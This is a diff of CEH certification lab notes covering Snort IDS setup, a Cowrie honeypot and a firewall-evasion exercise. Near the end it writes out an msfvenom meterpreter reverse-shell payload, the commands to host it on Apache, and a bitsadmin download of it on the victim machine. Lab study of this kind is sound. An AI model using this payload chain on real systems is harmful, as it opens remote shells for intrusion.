@@ -11,10 +11,10 @@ tool used
 
 1. Install snort exe on the windows machine and Snort requires WinPcap to be installed on your machine.
 2. Snort installs itself in C:\Snort
-3. Navigate to the **etc folder** in the specified location, E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; **copy snort.conf and paste it in C:\Snort\etc**.
-4. Snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.
-5. Copy the **so_rules,rules,preprocs_rules** folder from E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.
-6. Open Command Prompt window ; type cd C:\Snort\bin and press Enter to access the bin folder in the command prompt. Run snort command to initiate snort.
+3. Navigate to the **etc folder** in the specified location, **E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc** of the Snort rules; **copy snort.conf and paste it in C:\Snort\etc**.
+4. Snort.conf is already present in **C:\Snort\etc**; replace the file with the newly copied file.
+5. Copy the **so_rules,rules,preprocs_rules** folder from **E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150** and paste into C:\Snort.
+6. Open Command Prompt  as **Administrator** window ; type **cd C:\Snort\bin** and press Enter to access the bin folder in the command prompt. Run snort command to initiate snort.
 7. Snort initializes; wait for it to complete. Press Ctrl+C after some time, Snort exits and comes back to C:\Snort\bin.
 8. Now type **snort -W**. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default.
 9. Observe your Ethernet Driver index number and write it down (in this task, it is 1).
@@ -61,7 +61,7 @@ alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.11 (msg:"ICMP-INFO PING"; icod
 39. Open command prompt window, type **cd C:\Snort\bin** and press Enter.
 40. Run command . Note: **replace X with your device ethernet index number**; in this task: **X is 1**.
 ```
- snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii to start Snort
+ snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii 
 ```
 41.  If you receive a **fatal error**, you should first **verify that you have typed all modifications correctly into the snort.conf file**, and then search through the file for entries matching your fatal error message.
 42. If you receive an error stating **“Could not create the registry key,” then run the command prompt as Administrator**.
@@ -90,21 +90,27 @@ tool used
 #### Cowrie
 
 ```
-sudo adduser --disbled-password cowrie
+sudo adduser --disabled-password cowrie
 ```
 
 → copy all the contents of the cowrie folder to `/home/ubuntu`
 
+- Note: If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder: ▪ Open Files and navigate to the + Other Locations from the left pane ▪ In the Connect to Server field, type **smb://10.10.1.11** and press Enter to access Windows 11 shared folders.
+
+
 open a new terminal and `sudo su`
+
 ```bash
 cd cowrie
 ```
 ```bash
 pip install --upgrade -r requirements.txt
 ```
+-> command to jump back to /home/ubuntu
 ```bash
 cd ..
 ```
+
 ```bash
 chnmod -R 777 cowrie
 ```
@@ -134,9 +140,14 @@ chmod 770 /etc/authbind/byport/22
 
 to create a virtual environment for cowrie
 ```bash
-virtualenv python=python3 cowrie-env
+virtualenv --python=python3 cowrie-env
+source cowrie-env/bin/activate 
 ```
 
+to activate a virtual environment for cowrie
+```bash
+source cowrie-env/bin/activate 
+```
 exit the root privileges
 ```bash
 exit
@@ -151,8 +162,12 @@ bin/cowrie start
 ```
 
 now the honeypot is set for anyone to try and break into out computer
+
+-> In the terminal, **acquire root privileges using sudo su command** and execute cd var/log/cowrie/ to navigate to var/log/cowrie. Now, run tail cowrie.log to view the log file.
+
 the logs of attempts on our honeypot are seen by reading
 ```bash
+sudo su
 tail /var/logs/cowrie/cowrie.log
 ```
 by default this command only shows the last 10 lines of the logs
@@ -211,7 +226,7 @@ hence the request will generate from the inside so it is less likely to be stopp
 but to implement this command first we need to have our `exploit.exe` in the right place
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.1.13 -f exe -O Exploit.exe
+msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.1.13 -f exe -o exploit.exe
 ```
 
 ```bash
@@ -224,6 +239,9 @@ chmod -R 755 /var/www/html/share
 chown -R www-data:www-data /var/www/html/share
 ```
 ```bash
+cp exploit.exe /var/www/html/share
+```
+```bash
 service apache2 start
 ```
 
@@ -232,7 +250,7 @@ In Victim windows machine:
 Turn on windows defender firewall and then do follow below cmd:
 
 ```PowerShell
-bitsadmin /transfer exploit.exe http://10.10.1.12/share/exploit.exe c:\exploit.exe
+bitsadmin /transfer exploit.exe http://10.10.1.13/share/exploit.exe c:\exploit.exe
 ```
 
 
